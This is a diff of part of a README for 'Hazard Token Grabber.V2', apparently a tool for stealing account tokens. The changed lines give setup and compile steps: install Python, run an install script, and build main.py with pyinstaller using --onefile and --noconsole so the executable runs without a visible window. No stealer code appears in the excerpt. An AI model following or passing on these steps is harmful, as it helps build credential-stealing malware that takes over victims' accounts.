@@ -31,9 +31,12 @@ Love ❌ code ✅
 ### 📁・Setting up Hazard Token Grabber.V2
 1. Start off by installing [python](https://www.python.org/) ofc
 2. run the `Install_requirements.cmd` and wait for it to install all the
-3. 
+
+
+### ⚙・Compiling Source Code
+Start of by opening a cmd in your directory and type:
 ```
-pyinstaller --onefile --noconsole main.py
+pyinstaller --onefile --clean --noconsole main.py
 ```
 replace main.py with the file name if you changed it
 3 folders and 1 file will be created, you can delete them all except for the dist folder
